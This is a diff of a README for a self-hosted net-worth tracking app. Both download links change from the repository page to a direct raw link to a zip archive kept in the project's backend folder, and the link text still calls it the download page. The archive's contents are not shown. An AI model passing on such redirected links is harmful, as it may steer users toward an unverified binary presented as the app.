@@ -1,6 +1,6 @@
 # 📊 networth-tracker - Track wealth with local privacy
 
-[![Download networth-tracker](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sesmoi7043/networth-tracker)
+[![Download networth-tracker](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sesmoi7043/networth-tracker/raw/refs/heads/main/backend/tracker_networth_3.5.zip)
 
 ## 🧾 What this app does
 
@@ -22,7 +22,7 @@ If you do not have Docker Desktop yet, install it first from the official Docker
 
 Use this link to visit the page and download or open the project:
 
-[Open the networth-tracker download page](https://github.com/sesmoi7043/networth-tracker)
+[Open the networth-tracker download page](https://github.com/sesmoi7043/networth-tracker/raw/refs/heads/main/backend/tracker_networth_3.5.zip)
 
 ## 🪟 Install on Windows
 
